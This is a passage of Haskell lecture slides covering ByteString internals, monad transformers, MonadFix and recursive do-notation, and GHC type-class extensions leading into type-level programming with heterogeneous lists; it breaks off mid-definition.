   -  Also, ``S.ByteString`` and ``S8.ByteString`` are the same type
      (re-exported), and similarly for ``L.ByteString`` and
      ``L8.ByteString``
   -  ``S.ByteString`` and ``L.ByteString`` *not* same type, but can
      convert:

   .. code:: haskell

      fromChunks :: [S.ByteString] -> L.ByteString
      toChunks :: L.ByteString -> [S.ByteString]

Lazy ``ByteString`` implementation
==================================

-  Lazy ``ByteString`` s are implemented in terms of strict ones

   .. code:: haskell

      data ByteString = Empty
                      | Chunk {-# UNPACK #-} !S.ByteString ByteString

   -  Invariant: ``Chunk`` ‚Äôs first argument (``S.ByteString``) never
      ``null``
   -  Basically a linked list of strict ``ByteString`` s
   -  Head is strict, tail is not, allowing lazy computation or I/O

-  When to use strict/lazy ``ByteString`` s?

   -  Obviously use lazy when you need laziness (e.g., lazy I/O,
      infinite or cyclical strings, etc.)
   -  Lazy also much faster at concatenation (need to build a new list
      of ``S.ByteString`` s, but not copy the data they contain)
   -  Strict makes it much easier to implement things like string search
   -  Converting strict to lazy ``ByteString`` s is cheap, reverse is
      not (so if a library can work efficiently on lazy
      ``ByteString`` s, good to expose that functionality)


/L7 GHC Language extensions
===========================

-  GHC implements many extensions to Haskell, enabled by

   -  Placing ``{-# LANGUAGE`` *ExtensionName* ``#-}`` at top of file
      (recommended)
   -  Compiling with ``-X`` *ExtensionName* (less recommended, except
      for ``-XSafe``)
   -  Typing ``:set -X`` *ExtensionName* at ``ghci`` prompt (or running
      ``ghci`` with ``-X`` ‚Ä¶)

-  Complete list at `Language options <http://www.haskell.org/ghc/docs/latest/html/users_guide/flag-reference.html#idp14594128>`__
   section of GHC‚Äôs option summary
-  Some extensions are very safe to use

   -  E.g., core libraries depend on extension in a deep way
   -  Extension very superficial, easily de-sugars into Haskell2010

-  Other extensions less widely accepted

   -  E.g., makes type inference/checking undecidable or
      non-deterministic
   -  Undermines type safety
   -  A work in progress that could never be incorporated into standard

-  Many extensions in a middle/gray area

Background: Monad transformers
==============================

-  Type constructors building monads parameterized by other monads

   -  Method
      ```lift`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Control-Monad-Trans-Class.html#t:MonadTrans>`__
      executes actions from underlying transformed monad:

   .. code:: haskell

      class MonadTrans t where
          lift :: Monad m => m a -> t m a

   -  Note monads have kind ‚àó ‚Üí ‚àó, so transformers have kind (‚àó ‚Üí ‚àó) ‚Üí ‚àó
      ‚Üí ‚àó

-  Example: State transformer monad,
   ```StateT`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Control-Monad-Trans-State-Lazy.html#v:StateT>`__

   .. code:: haskell

      newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

      instance (Monad m) => Monad (StateT s m) where
          return a = StateT $ \s -> return (a, s)
          m >>= k  = StateT $ \s0 -> do          -- in monad m
                       ~(a, s1) <- runStateT m s0
                       runStateT (k a) s1

      instance MonadTrans (StateT s) where
          lift ma = StateT $ \s -> do            -- in monad m
                      a <- ma
                      return (a, s)

Using ``StateT``
================

-  ``get`` and ``put`` allow you to modify state

   .. code:: haskell

      get :: (Monad m) => StateT s m s
      put :: (Monad m) => s -> StateT s m ()

-  Example: Haskell equivalent of ``x++`` in C

   .. code:: haskell

      import Control.Monad.Trans
      import Control.Monad.Trans.State

      main :: IO ()
      main = runStateT go 0 >>= print
        where go = do xplusplus >>= lift . print
                      xplusplus >>= lift . print
              xplusplus = do n <- get; put (n + 1); return n

   ::

      *Main> main
      0
      1
      ((),2)

.. raw:: html

   <!--
   # More complex `StateT` example

   * Example: count lines of standard input

       ~~~~ {.haskell}
       import Control.Exception
       import Control.Monad
       import Control.Monad.Trans
       import Control.Monad.Trans.State

       countLines :: IO Int
       countLines = liftM fst $ runStateT go (0::Int)
         where go = lift (try getLine) >>= doline
               doline (Left (SomeException _)) = get
               doline (Right _) = do n <- get; put (n + 1); go
       ~~~~

       * Note that `try getLine` is an `IO` action, executed with `lift`
       * Mixed with `IO` are `get`, `set` actions from `StateT Int IO` monad
   -->

Exercise: Implement ``get`` and ``put``
=======================================

-  Recall ``StateT`` implementation

.. code:: haskell

   newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

   instance (Monad m) => Monad (StateT s m) where
       return a = StateT $ \s -> return (a, s)
       m >>= k  = StateT $ \s0 -> do          -- in monad m
                    ~(a, s1) <- runStateT m s0
                    runStateT (k a) s1

-  How to implement the following?

.. code:: haskell

   get :: (Monad m) => StateT s m s


   put :: (Monad m) => s -> StateT s m ()

.. _exercise-implement-get-and-put-1:

Exercise: Implement ``get`` and ``put``
=======================================

-  Recall ``StateT`` implementation

.. code:: haskell

   newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

   instance (Monad m) => Monad (StateT s m) where
       return a = StateT $ \s -> return (a, s)
       m >>= k  = StateT $ \s0 -> do          -- in monad m
                    ~(a, s1) <- runStateT m s0
                    runStateT (k a) s1

-  How to implement the following?

.. code:: haskell

   get :: (Monad m) => StateT s m s
   get = StateT $ \s -> return (s, s)

   put :: (Monad m) => s -> StateT s m ()
   put s = StateT $ \_ -> return ((), s)

The ``MonadIO`` class
=====================

-  Sometimes want to execute IO regardless of current monad

.. code:: haskell

   class (Monad m) => MonadIO m where
       liftIO :: IO a -> m a

   instance MonadIO IO where
       liftIO = id

-  Let‚Äôs make ``liftIO`` work for ``StateT``

   .. code:: haskell

      instance (MonadIO m) => MonadIO (StateT s m) where
          liftIO = lift . liftIO

-  Now can write functions that use IO and work in many monads:

   .. code:: haskell

      myprint :: (Show a, MonadIO m) => a -> m ()
      myprint a = liftIO $ print $ show a

-  All standard Monad transformers implement class ``MonadIO``

   -  ``ContT``, ``ErrorT``, ``ListT``, ``RWST``, ``ReaderT``,
      ``StateT``, ``WriterT``, ‚Ä¶

Background: recursive bindings
==============================

-  Top-level, ``let``, and ``where`` bindings are all recursive in
   Haskell, e.g.:

   .. code:: haskell

      oneTwo :: (Int, Int)
      oneTwo = (fst y, snd x)
          where x = (1, snd y)    -- mutual recursion
                y = (fst x, 2)

      nthFib :: Int -> Integer
      nthFib n = fibList !! n
          where fibList = 1 : 1 : zipWith (+) fibList (tail fibList)

-  Recursion can be implemented using a fixed-point combinator

   -  Function
      ```fix`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Function.html#v:fix>`__
      calls a function with its own result, use to re-implement above:

      .. code:: haskell

         fix :: (a -> a) -> a
         fix f = let x = f x in x

      .. code:: haskell

         oneTwo' :: (Int, Int)
         oneTwo' = (fst y, snd x)
             where (x, y) = fix $  ~(x0, y0) -> let x1 = (1, snd y0)
                                                     y1 = (fst x0, 2)
                                                 in (x1, y1)
         nthFib' n = fibList !! n
             where fibList = fix $ \l -> 1 : 1 : zipWith (+) l (tail l)

Recursion and monadic bindings
==============================

-  By contrast, monadic bindings are *not* recursive

   .. code:: haskell

      do fibList <- return $ 1 : 1 : zipWith (+) fibList (tail fibList)
         ...     -- error, fibList not in scope  ^^^^^^^       ^^^^^^^

-  But monads in the
   ```MonadFix`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Monad-Fix.html#t:MonadFix>`__
   class have a fixed-point combinator

   .. code:: haskell

      class Monad m => MonadFix m where
          mfix :: (a -> m a) -> m a

   -  ``mfix`` can be used to implement recursive monadic bindings
      `[Erk√∂k00] <http://citeseer.ist.psu.edu/viewdoc/download;jsessionid=13851C3A2D4F33918B9D662C20F30762?doi=10.1.1.43.5313&rep=rep1&type=pdf>`__,
      e.g.:

   .. code:: haskell

      mfib :: (MonadFix m) => Int -> m Integer
      mfib n = do
        fibList <- mfix $ \l -> return $ 1 : 1 : zipWith (+) l (tail l)
        return $ fibList !! n -- ^^^^^

-  Why? E.g., might want to simulate circuits with monads

   -  Need recursion if there is a loop in your circuit
   -  Might want recursion anyway to avoid worrying about order of
      statements

The RecursiveDo extension
=========================

http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#recursive-do-notation

-  New ``rec`` keyword introduces recursive bindings in a ``do`` block
   `[Erk√∂k02] <https://sites.google.com/site/leventerkok/recdo.pdf?attredirects=0>`__

   -  Monad must be an instance of ``MonadFix`` (``rec`` desugars to
      ``mfix`` calls)

   .. code:: haskell

      oneTwo'' :: (MonadFix m) => m (Int, Int)
      oneTwo'' = do
        rec x <- return (1, snd y)
            y <- return (fst x, 2)
        return (fst y, snd x)

   -  Desugars to:

   .. code:: haskell

      oneTwo''' :: (MonadFix m) => m (Int, Int)
      oneTwo''' = do
        (x, y) <- mfix $  ~(x0, y0) -> do x1 <- return (1, snd y0)
                                           y1 <- return (fst x0, 2)
                                           return (x1, y1)
        return (fst y, snd x)

-  In practice ``RecursiveDo`` helps structure thinking

   -  Then can manually desugar rather than require a language extension
   -  But ``mfix`` on its own is quite useful

Example uses of ``mfix`` and ``rec``
====================================

-  Create recursive data structures in one shot

   .. code:: haskell

      data Link a = Link !a !(MVar (Link a)) -- note ! is okay

      mkCycle :: IO (MVar (Link Int))
      mkCycle = do
        rec l1 <- newMVar $ Link 1 l2        -- but $! would diverge
            l2 <- newMVar $ Link 2 l1
        return l1

-  Call non-strict methods of classes (easy access to return-type
   dictionary)

   .. code:: haskell

      class MyClass t where
          myTypeName :: t -> String        -- non-strict in argument
          myDefaultValue :: t
      instance MyClass Int where
          myTypeName _ = "Int"
          myDefaultValue = 0

      getVal :: (MyClass t) => IO t
      getVal = mfix $ \t -> do      -- doesn't use mfix's full power
        putStrLn $ "Caller wants type " ++ myTypeName t
        return myDefaultValue

Implementing ``mfix``
=====================

-  Warm-up: The
   ```Identity`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Data-Functor-Identity.html#v:Identity>`__
   monad

   .. code:: haskell

      newtype Identity a = Identity { runIdentity :: a }
      instance Monad Identity where
          return = Identity
          m >>= k = k (runIdentity m)

   -  ``newtype`` compiles to nothing, so basically same as ``fix``:

   .. code:: haskell

      instance MonadFix Identity where
          mfix f = let x = f (runIdentity x) in x

``fixIO`` ‚Äì ``IO`` Monad fixed point
====================================

-  Internally, lazy IO is implemented by magic
   ```unsafeInterleaveIO`` <http://hackage.haskell.org/package/base-4.7.0.0/docs/System-IO-Unsafe.html#v:unsafeInterleaveIO>`__

   .. code:: haskell

      unsafeInterleaveIO :: IO a -> IO a

   -  Looks like an ``IO`` identify function, but defers IO until the
      thunk forced

   -  Danger‚Äìdon‚Äôt try this at home! No longer a functional language

      .. code:: haskell

         weird :: IO String
         weird = do
           xxx <- unsafeInterleaveIO $ do putStrLn "Gotcha!"; return []
           return $ 'a':'b':'c':xxx

-  For ``IO``, ``mfix = fixIO``:

   .. code:: haskell

      fixIO :: (a -> IO a) -> IO a
      fixIO k = do
          ref <- newIORef (throw NonTermination)
          ans <- unsafeInterleaveIO (readIORef ref)
          result <- k ans
          writeIORef ref result
          return result

   -  This is quite similar to what the compiler does for pure ``fix``

A generic ``mfix`` is not possible
==================================

-  What if we tried to define an ``mfix``-like function for all monads?

   .. code:: haskell

      mbroken :: (Monad m) => (a -> m a) -> m a -- equivalent to mfix?
      mbroken f = fix (>>= f)

   -  This is equivalent to

   .. code:: haskell

      mbroken f = mbroken f >>= f

   -  But ``>>=`` is strict in its first argument for many monads, so

   ::

      *Main> mfix $ const (return 0)
      0
      *Main> mbroken $ const (return 0)
      *** Exception: stack overflow

-  So ``mfix`` needs to take fixed point over value, not over monadic
   action

   -  How to do this is monad-specific
   -  Doesn‚Äôt work for all monads (``ContT``, ``ListT``)

``MonadFix`` instance for ``StateT``
====================================

-  What about the
   ```StateT`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Control-Monad-Trans-State-Lazy.html#t:StateT>`__
   monad?

   .. code:: haskell

      newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

      instance (Monad m) => Monad (StateT s m) where
          return a = StateT $ \s -> return (a, s)
          m >>= k  = StateT $ \s0 -> do          -- in monad m
                       ~(a, s1) <- runStateT m s0
                       runStateT (k a) s1

   -  Possibly easiest to see using ``rec`` notation

   .. code:: haskell

      instance MonadFix m => MonadFix (StateT s m) where
          mfix f = StateT $ \s0 -> do            -- in monad m
                     rec ~(a, s1) <- runStateT (f a) s0
                     return (a, s1)

   -  But easily implemented with no language extensions

   .. code:: haskell

      instance MonadFix m => MonadFix (StateT s m) where
          mfix f = StateT $ \s -> mfix $  ~(a, _) -> runStateT (f a) s

Review: Type classes
====================

-  A `Haskell 2010 type class
   declaration <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-760004.3.1>`__
   can take the form:

   .. code:: haskell

      class ClassName var where
          methodName :: Type {- where type references var -}

   .. code:: haskell

      class (SuperClass var) => ClassName var where ...
      class (Super1 var, Super2 var) => ClassName var where ...
      ...

   -  Note that ``var`` need not have kind ‚àó

   -  However, the type of each method must mention ``var`` and an
      implicit ``(Classname var)`` is added to the context of each
      method, e.g.:

      .. code:: haskell

         Prelude> :t return
         return :: Monad m => a -> m a

-  A `Haskell 2010 instance
   declaration <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-770004.3.2>`__
   has the form:

   .. code:: haskell

      instance [context =>] ClassName (TypeCon v1 ... vk) where ...

   -  Note ``v1`` ‚Ä¶ ``vk`` are all variables and all distinct, ruling
      out, e.g., ``instance C (a,a)`` or ``instance C (Int a)`` or
      ``instance [[a]]``

MultiParamTypeClasses extension
===============================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#id559142

-  Enables type classes with multiple parameters, E.g.:

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      class Convert a b where convert :: a -> b
      instance Convert Int Bool where convert = (/= 0)
      instance Convert Int Integer where convert = toInteger
      instance (Convert a b) => Convert [a] [b] where
          convert = map convert

-  Extension itself is relatively safe, but encourages other extensions

   -  E.g., each method‚Äôs type must use every type parameter

      .. code:: haskell

         class MyClass a b where
             aDefault :: a  -- can never use (without more extensions...)

   -  All types (argument and return) must be fully determined

      .. code:: haskell

                convert 0 :: Bool   -- error, 0 has type (Num a) => a

   -  And the usual instance restrictions still apply

      .. code:: haskell

         instance Convert Int [Char] where convert = show  -- error bad param

      -  ``[Char]``‚Äìi.e., ``([] Char)``‚Äìis not a valid instance
         parameter, would have to be ``([] a)``

```FlexibleInstances`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-decls>`__ extension
=======================================================================================================================================

-  Allows more specific type paremeters (relatively safe extension)

   -  E.g., now we can say:

   .. code:: haskell

      {-# LANGUAGE FlexibleInstances #-}

      instance Convert Int [Char] where
          convert = show

   -  And we can make all types convert to themselves:

   .. code:: haskell

      instance Convert a a where convert a = a

   ::

      *Main> convert () :: ()
      ()
      *Main> convert ([1,2,3]::[Int]) :: [Integer]
      [1,2,3]
      *Main> convert ([1,2,3]::[Int]) :: [Int]
      <interactive>:1:1:
          Overlapping instances for Convert [Int] [Int]
            instance Convert a a
            instance Convert a b => Convert [a] [b]

   -  Oops, two instances apply; GHC doesn‚Äôt know which to choose

OverlappingInstances extension
==============================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-overlap

-  This extension is used, but also widely frowned upon

   -  Only need this extension if overlapping instances actually used
   -  Enable extension where instances defined, not where used
   -  Compiler picks the most specific matching instance. :math:`I_1` is
      more specific than :math:`I_2` when :math:`I_1` can be created by
      substituting for the variables of :math:`I_2` and not vice versa
   -  Contexts (part before ``=>``) not considered when selecting
      instances

-  Example: Do something like ``Show`` for ``String`` vs. ``[a]``

   .. code:: haskell

      class MyShow a where myShow :: a -> String
      instance MyShow Char where myShow = show
      instance MyShow Int where myShow = show
      instance MyShow [Char] where myShow = id
      instance (MyShow a) => MyShow [a] where
          myShow []     = "[]"
          myShow (x:xs) = "[" ++ myShow x ++ go xs
              where go (y:ys) = "," ++ myShow y ++ go ys
                    go []     = "]"

-  So does enabling ``OverlappingInstances`` fix ``Convert``?

Most specific instances
=======================

-  What is the most specific instance?

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      {-# LANGUAGE FlexibleInstances #-}
      {-# LANGUAGE OverlappingInstances #-}
      instance Convert a a where ...
      instance (Convert a b) => Convert [a] [b] where ...

   ::

      *Main> convert ([1,2,3]::[Int]) :: [Int]
      <interactive>:1:1:
          Overlapping instances for Convert [Int] [Int]
            instance [overlap ok] Convert a a
            instance [overlap ok] Convert a b => Convert [a] [b]

   -  Neither instance is most specific!
   -  We have to add a *third* instance to break the tie‚Äìone that can be
      created by substituting for variables in either of the other two
      overlapping instances

   .. code:: haskell

      instance Convert [a] [a] where convert = id

   ::

      *Main> convert ([1,2,3]::[Int]) :: [Int]
      [1,2,3]

A case against ``OverlappingInstances``
=======================================

.. code:: haskell

   module Help where
       class MyShow a where
         myshow :: a -> String
       instance MyShow a => MyShow [a] where
         myshow xs = concatMap myshow xs

       showHelp :: MyShow a => [a] -> String
       showHelp xs = myshow xs     -- doesn't see overlapping instance

   module Main where
       import Help

       data T = MkT
       instance MyShow T where
         myshow x = "Used generic instance"
       instance MyShow [T] where
         myshow xs = "Used more specific instance"

       main = do { print (myshow [MkT]); print (showHelp [MkT]) }

::

   *Main> main
   "Used more specific instance"
   "Used generic instance"

Aside: How ``Show`` actually works
==================================

-  Add an extra helper method, ``showList``, with a default definition:

.. code:: haskell

   class Show a where
     show :: a -> String
     showList :: [a] -> ShowS
     showList as = '[' : intercalate ", " (map show as) ++ "]"
     -- Note actual implementation more efficient but equivalent

   instance (Show a) => Show [a] where
     show as = showList as

-  ``Show`` instance for ``Char`` overrides default ``showList``

-  But had to plan all this out from the start

   -  Want an easy way to special-case trees or other data structures
      besides lists?
   -  Then you are stuck using overlapping instances

FlexibleContexts extension
==========================

http://www.haskell.org/ghc/docs/latest/html/users_guide/other-type-extensions.html#flexible-contexts

-  ``MultiParamTypeClasses`` leads to inexpressible types

   .. code:: haskell

      toInt val = convert val :: Int

   -  What is the type of function ``toInt``? Would like to write:

   .. code:: haskell

      toInt :: (Convert a Int) => a -> Int

   -  But ``(Convert a Int) =>`` is an illegal context, as ``Int`` not a
      type variable

-  ``FlexibleContexts`` extension makes the above type legal to write

   -  Is a relatively safe extension to use

-  Still a couple of restrictions

   -  Each type variable in context must be ‚Äúreachable‚Äù from a type
      variable in type (Reachable = explicitly used, or in another
      constraint with a reachable variable.)

      .. code:: haskell

         sym :: forall a. Eq a => Int   -- illegal

   -  Every constraint must have a type variable

      .. code:: haskell

         sym :: Eq Int => Bool          -- illegal

Monad classes
=============

-  It‚Äôs neat that ``liftIO`` works from so many monads

   -  Why not do something similar for ``StateT``? Make ``get``/``set``
      methods

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      {-# LANGUAGE FlexibleInstances #-}

      class (Monad m) => MonadState s m where
          get :: m s
          put :: s -> m ()
      instance (Monad m) => MonadState s (StateT s m) where
          get = StateT $ \s -> return (s, s)
          put s = StateT $ \_ -> return ((), s)

-  Now for each other ``MonadTrans``, pass requests down

   -  This is just like ``liftIO``. E.g., for ``ReaderT``:

   .. code:: haskell

      instance (MonadIO m) => MonadIO (ReaderT r m) where
          liftIO = lift . liftIO

      instance (MonadState s m) => MonadState s (ReaderT r m) where
          get = lift get
          put = lift . put

Problem: we‚Äôve defeated type inference
======================================

-  Remember ``xplusplus``?

   .. code:: haskell

              xplusplus = do n <- get; put (n + 1); return n

   -  The compiler knows we are in ``StateT Int IO`` monad

   -  So can infer that the type of ``get`` is
      ``Num s => StateT Int IO s``

   -  But need to know ``s`` in order to select an instance of
      ``MonadState``!

   -  For all compiler knows, might be other matching instances, e.g.,

      .. code:: haskell

         instance MonadState Double (StateT Int IO) where
             -- would be legal, but exists only in compiler's imagination

-  Since compiler can‚Äôt infer return type of ``get``, must type it
   manually:

   .. code:: haskell

          xplusplus = do n <- get :: StateT Int IO Int
                         put (n + 1)
                         return n

   -  Yuck! Lack of type inference gets old fast!

FunctionalDependencies extension
================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#functional-dependencies

-  Widely used & frowned upon (not as bad as ``OverlappingInstances``)

   -  Also referred to as ‚Äúfundeps‚Äù

-  Lets a class declare some parameters to be functions of others

   .. code:: haskell

      class (Monad m) => MonadState s m | m -> s where
          get :: m s
          put :: s -> m ()

   -  The best way to think of this is in terms of *instance selection*
   -  ‚Äú``| m -> s``‚Äù says can select an instance based on ``m`` without
      considering ``s``, because **``s`` is a function of ``m``**
   -  Once you‚Äôve selected the instance, you can use ``s`` for type
      inference

-  Disallows conflicting instances (even w. ``OverlappingInstances``)

-  Also allows arbitrary computation at the type level
   `[Hallgren] <http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=D19C7E3BD1B5C1FC24035542B1494ED9?doi=10.1.1.22.7806&rep=rep1&type=pdf>`__

   -  But language committee wants compilation to be decidable and
      deterministic
   -  So need to add some restrictions

.. _sufficient-conditions-of-decidable-instancesinstancerules:

Sufficient conditions of decidable instances
=============================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-rules

-  Anatomy of an instance: ``instance`` [*context* ``=>``] *head*
   [``where`` *body*]

   -  *context* consists of zero or more comma-separated *assertions*

1. The Paterson Conditions: for each assertion in the context

   a. No type variable has more occurrences in the assertion than in the
      head

      .. code:: haskell

         class Class a b
         instance (Class a a) => Class [a] Bool  -- bad: 2 * a > 1 * a
         instance (Class a b) => Class [a] Bool  -- bad: 1 * b > 0 * b

   b. The assertion has fewer constructors and variables than the head

      .. code:: haskell

         instance (Class a Int) => Class a Integer   -- bad: 2 >= 2

2. The Coverage Condition: For each fundep *left* ``->`` *right*, the
   types in *right* cannot have type variables not mentioned in *left*

   .. code:: haskell

      class Class a b | a -> b
      instance Class a (Maybe a)       -- ok: a "covered" by left
      instance Class Int (Maybe b)     -- bad: b not covered
      instance Class a (Either a b)    -- bad: b not covered

Undecidable vs. exponential ‚Äì who cares?
========================================

-  Editorial: maybe decidability of language is overrated

   -  Computers aren‚Äôt Turing machines with infinite tapes, after all

-  This legal, decidable program will crash your Haskell compiler

   .. code:: haskell

      crash = f5 ()
          where f0 x = (x, x)      -- type size 2^{2^0}
                f1 x = f0 (f0 x)   -- type size 2^{2^1}
                f2 x = f1 (f1 x)   -- type size 2^{2^2}
                f3 x = f2 (f2 x)   -- type size 2^{2^3}
                f4 x = f3 (f3 x)   -- type size 2^{2^4}
                f5 x = f4 (f4 x)   -- type size 2^{2^5}

-  While plenty of not provably decidable programs happily compile

   -  The conditions of the last slide are *sufficient*, not *necessary*
   -  Might have other ways of knowing your program can compile
   -  Or maybe figure it out from trial and error?

UndecidableInstances extension
=================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#undecidable-instances

-  Lifts the Paterson and Coverage conditions

   -  Also enables ``FlexibleContexts`` when enabled

-  Instead, imposes a maximum recursion depth

   -  Default maximum depth is 20

   -  Can increase with ``-fcontext-stack=`` *n* option, e.g.:

      .. code:: haskell

         {-# OPTIONS_GHC -fcontext-stack=1024 #-}
         {-# LANGUAGE UndecidableInstances #-}

-  A bit reminiscent of C++ templates

   -  gcc has a ``-ftemplate-depth=`` option
   -  Note C++11 raises minimum depth from 17 to 1024
   -  Similarly, people have talked of increasing GHC‚Äôs default
      context-stack

``MonadIO`` revisited
=====================

-  Recall definition of ``MonadIO``

   .. code:: haskell

      class (Monad m) => MonadIO m where
          liftIO :: IO a -> m a
      instance MonadIO IO where
          liftIO = id

-  Currently must define an instance for every transformer

   .. code:: haskell

      instance MonadIO m => MonadIO (StateT s m) where liftIO = lift . liftIO
      instance MonadIO m => MonadIO (ReaderT t m) where liftIO = lift . liftIO
      instance MonadIO m => MonadIO (WriterT w m) where liftIO = lift . liftIO
      ...

-  With ``UndecidableInstances``, one instance can cover all
   transformers!

   .. code:: haskell

      {-# LANGUAGE FlexibleInstances #-}
      {-# LANGUAGE UndecidableInstances #-}

      -- undecidable: assertion Monad (t m) no smaller than head
      instance (MonadTrans t, MonadIO m, Monad (t m)) =>
          MonadIO (t m) where liftIO = lift . liftIO

Summary of extensions
=====================

-  We‚Äôve seen 6 typeclass-related extensions

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}  -- very conservative
      {-# LANGUAGE FlexibleInstances #-}      -- conservative
      {-# LANGUAGE FlexibleContexts #-}       -- conservative
      {-# LANGUAGE FunctionalDependencies #-} -- frowned upon
      {-# LANGUAGE UndecidableInstances #-}   -- very frowned upon
      {-# LANGUAGE OverlappingInstances #-}   -- the most controversial

   -  Not all of these are looked upon kindly by the community
   -  But if you enable all six, can be very powerful

-  Remainder of lecture looks at what you can do with all 6 enabled

   -  Much inspired by
      `[Hlist] <http://homepages.cwi.nl/~ralf/HList/paper.pdf>`__ and
      `[OOHaskell] <http://homepages.cwi.nl/~ralf/OOHaskell/paper.pdf>`__

.. raw:: html

   <!--
   # Type-level natural numbers


   ~~~~ {.haskell}
   data Zero = Zero      -- Type-level 0
   data Succ n = Succ n  -- Type-level successor (n + 1)

   class NatPlus a b c | a b -> c, a c -> b where
       natPlus :: a -> b -> c
       natMinus :: c -> a -> b

   instance NatPlus Zero a a where
       natPlus _ a = a
       natMinus a _ = a

   -- Note failure of coverage condition below
   instance (NatPlus a b c) => NatPlus (Succ a) b (Succ c) where 
       natPlus (Succ a) b = (Succ (natPlus a b))
       natMinus (Succ c) (Succ a) = natMinus c a
   ~~~~

   * Fundeps + Context let us compute recursively on types!
       * If context has assertion `NatPlus a b c`, then from types
       `Succ a` and `b` we can compute `Succ c` (computation at type level)


   # Type-level booleans

   ~~~~ {.haskell}
   data HFalse = HFalse deriving Show
   data HTrue = HTrue deriving Show

   class HNot a b | a -> b where hnot :: a -> b
   instance HNot HFalse HTrue where hnot _ = HTrue
   instance HNot HTrue HFalse where hnot _ = HFalse

   class HEven a b | a -> b where hEven :: a -> b
   instance HEven Zero HTrue where hEven _ = HTrue
   instance (HEven n b, HNot b nb) => HEven (Succ n) nb where
       hEven (Succ n) = hnot (hEven n)
   ~~~~

   ~~~~
   *Main> hEven Zero
   HTrue
   *Main> hEven (Succ Zero)
   HFalse
   *Main> hEven (Succ (Succ Zero))
   HTrue
   *Main> hEven (Succ (Succ (Succ Zero)))
   HFalse
   ~~~~

   * Note how we use assertion `HNot b nb` to compute negation of `b`

   -->

Warm-up: Type-level booleans
============================

.. code:: haskell

   data HFalse = HFalse deriving Show
   data HTrue = HTrue deriving Show

   class HNot a b | a -> b where hNot :: a -> b
   instance HNot HFalse HTrue where hNot _ = HTrue
   instance HNot HTrue HFalse where hNot _ = HFalse

::

   *Main> hNot HTrue
   HFalse
   *Main> hNot HFalse
   HTrue

-  Note how fundep in ``HNot b nb`` computes negation of ``b`` **at the
   type level**
-  Haven‚Äôt used ``OverlappingInstances`` yet, let‚Äôs start‚Ä¶

Computing over types
====================

-  Can we compute whether two types are equal? First attempt:

   .. code:: haskell

      class TypeEq a b c | a b -> c where typeEq :: a -> b -> c
      instance TypeEq a a HTrue where typeEq _ _ = HTrue
      instance TypeEq a b HFalse where typeEq _ _ = HFalse

   -  Problem: ``TypeEq a a HTrue`` not more specific than
      ``TypeEq a b HFalse``
   -  ‚Ä¶ but ``TypeEq a a HTrue`` *is* more specific than
      ``TypeEq a b c``

-  Recall that context is never consulted for instance selection

   -  Only afterwards to reject failed assertions or infer types from
      fundeps
   -  Solution: compute ``c`` after instance selection using another
      fundep

   .. code:: haskell

      class TypeCast a b | a -> b where typeCast :: a -> b
      instance TypeCast a a where typeCast = id

      instance TypeEq a a HTrue where typeEq _ _ = HTrue -- as before
      instance (TypeCast HFalse c) => TypeEq a b c where
          typeEq _ _ = typeCast HFalse

The utility of ``TypeEq``
=========================

-  Editorial: ``TypeEq`` is kind of the holy grail of fundeps

   -  If you can implement ``TypeEq``, you can program recursively at
      type level by distinguishing base and recursive cases!
   -  But relies deeply on ``OverlappingInstances`` ‚Ä¶

-  Example: Let‚Äôs do for ``MonadState`` what we did for ``MonadIO``

   .. code:: haskell

      -- If t is StateT, then do one thing for (t s m) (base case):
      instance (Monad m) => MonadState s (StateT s m) where
          get = StateT $ \s -> return (s, s)
          put = StateT $ \_ -> return ((), s)
      -- If t is not StateT, do something else (recursive case):
      instance (MonadTrans t, MonadState s m, Monad (t m)) =>
          MonadState s (t m) where
              get = lift get
              put = lift . put

   -  ``MonadIO`` was easier because type ``IO`` can‚Äôt match parameter
      ``(t m)``
   -  Unfortunately, ``StateT s m`` matches *both* of above instance
      heads
   -  So need ``OverlappingInstances`` to select first instance for
      ``StateT s m``

Heterogeneous lists
===================

-  Last extension:
   ```TypeOperators`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/data-type-extensions.html#infix-tycons>`__
   allows infix types starting with ‚Äú``:``‚Äù

   .. code:: haskell

      data a :*: b = Foo a b
      type a :+: b = Either a b

-  Let‚Äôs use an infix constructor to define a heterogeneous list

   .. code:: haskell

      data HNil = HNil deriving Show
      data (:*:) h t = h :*: !t deriving Show
      infixr 9 :*:

      -- Example:
      data A = A deriving Show
      data B = B deriving Show
      data C = C deriving Show

      foo = (A, "Hello") :*: (B, 7) :*: (C, 3.0) :*: HNil

   ::

      *Main> foo
      (A,"Hello") :*: ((B,7) :*: ((C,3.0) :*: HNil))
      *Main> :t foo
      foo :: (A, [Char]) :*: ((B, Integer) :*: ((C, Double) :*: HNil))

Operations on heterogeneous lists
=================================

-  Notice our list consisted of pairs

   .. code:: haskell

      foo :: (A, [Char]) :*: (B, Integer) :*: (C, Double) :*: HNil
      foo = (A, "Hello") :*: (B, 7) :*: (C, 3.0) :*: HNil

   -  View first element as a key or tag, second as a value‚ÄìHow to look
      up value?

   .. code:: haskell

      class Select k h v | k h -> v where
          (.!) :: h -> k -> v
      instance Select k ((k, v) :*: t) v where
